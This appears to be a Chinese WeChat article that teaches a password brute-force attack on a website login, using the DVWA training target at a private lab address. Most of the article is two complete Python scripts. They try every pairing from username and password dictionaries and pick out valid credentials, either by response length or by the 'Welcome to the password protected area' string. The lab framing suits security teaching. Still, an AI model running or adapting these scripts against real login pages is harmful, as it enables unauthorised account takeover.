# 只用20行Python代码就攻破了网站登录

<a id="profileBt"></a><a id="js_name"></a>python数据分析之禅 *2022-03-23 12:33*

![](../../../_resources/0_wx_fmt_png_5590e9f0755e409cbe7f133343ae7267.png)

**python数据分析之禅**

点击领取pandas高清速查表，后台回复“速查表”获取

<a id="js_profile_article"></a>83篇原创内容

Official Account

大家好，我是鸟哥~

今天教大家用Python代码攻破网站登录（在测试靶机上进行实验），原理上是抓包和改包，如果学过的爬虫的话，相信你会快看懂这篇文章

测试靶机为DVWA，适合DVWA暴力破解模块的Low和Medium等级。

## **关键代码解释**

**url指定url地址**

```
url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"
```

**header设置请求头**

```
`header = {` `'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',` `'Cookie':'security=medium; PHPSESSID=geo7gb3ehf5gfnbhrvuqu545i7'``}`
```

**payload设置请求参数**

```
payload = {'username':username,'password':password,"Login":'Login'}
```

这一行的作用是作一次get请求，响应信息被变量Response接收。

```
 Response = requests.get(url,params=payload,headers=header)
```

**这两行代码循环遍历账号和密码字典文件，之后给他们做笛卡尔积循环暴力破解**

这种方式和burp的Intruder模块的Cluster bomb攻击方式一样。

```
`for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):` `for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):`
```

**然后把循环结果存放到csv文件里，用逗号分割数据**

Response.status_code是响应的http状态码，len(Response.content)是http响应报文的长度。

```
`result = str(Response.status_code) + ',' + username + ','\` `+ password + ',' + str(len(Response.content))``f.write(result + '\n')`
```

## **完整代码**

### 方法一

登陆成功的和失败返回数据不同，所以数据包长度也不同。包长度与其他不同的数据，可能就是正确的账号密码。

```
`import requests``url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"``#proxies= {"http":"http://127.0.0.1:8080"}  #代理设置，方便burp抓包查看``header = {` `'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',` `'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'``}``f = open('result.csv','w')``f.write('状态码' + ',' + '用户名' + ',' + '密码' + ',' + '包长度' + '\n')``for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):` `for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):` `username = admin.strip()` `password = line.strip()` `payload = {'username':username,'password':password,"Login":'Login'}` `Response = requests.get(url,params=payload,headers=header)` `result = str(Response.status_code) + ',' + username + ','\` `+ password + ',' + str(len(Response.content))` `f.write(result + '\n')``print('\n完成')`
```

#### 

#### 运行

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这就是脚本发送的数据包

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看结果

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看包长度与其他不同的数据，登录测试

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

### 方法二

这个方法是根据登陆成功的返回特征来判断是否为正确的账号密码，然后把正确的账号密码输出到屏幕和txt文件里。

主要改动在第17到20行

```
`import requests``url = "http://192.168.171.2/dvwa/vulnerabilities/brute/"``#proxies= {"http":"http://127.0.0.1:8080"}  #代理设置，方便burp抓包查看``header = {` `'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',` `'Cookie':'security=medium; PHPSESSID=bdi0ak5mqbud69nrnejgf8q00u'``}``f = open('result.txt','w')``for admin in open("C:\\Users\\admin\\Documents\\字典\\账号.txt"):` `for line in open("C:\\Users\\admin\\Documents\\字典\\密码.txt"):` `username = admin.strip()` `password = line.strip()` `payload = {'username':username,'password':password,"Login":'Login'}` `Response = requests.get(url,params=payload,headers=header)` `if not(Response.text.find('Welcome to the password protected area')==-1):` `result = username + ':' + password` `print(result)` `f.write(result + '\n')`  `print('\n完成')`
```

#### 

#### 运行

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![Image](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

People who liked this content also liked

分享 63 个面向前端开发人员的开源项目工具

前端达人

不看的原因

- 内容质量低
- 不看此公众号

Linux arp命令详解及C/C++代码实现

程序猿编码

不看的原因

- 内容质量低
- 不看此公众号

70行Go代码可以打败C！

硬件攻城狮

不看的原因

- 内容质量低
- 不看此公众号

<img width="102" height="102" src="../../../_resources/qrcode_scene_10000004_size_102___b87accb394e5489db.bmp"/>

Scan to Follow